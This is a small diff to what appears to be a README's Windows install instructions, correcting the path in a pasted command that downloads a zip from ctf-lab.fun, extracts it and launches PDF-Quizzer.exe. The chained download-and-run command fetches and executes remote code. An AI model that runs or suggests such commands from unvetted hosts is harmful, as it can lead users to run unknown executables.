@@ -24,7 +24,7 @@ To download, extract, and run the app using `curl`, paste the following in your 
 <pre>
 curl -L -o app.zip "https://ctf-lab.fun/v2/appv2.zip" && ^
 powershell -Command "Expand-Archive -Path 'app.zip' -DestinationPath 'app' -Force" && ^
-start app\\appv2\\PDF-Quizzer.exe
+start app\\app\\PDF-Quizzer.exe
 </pre>
 
 ---
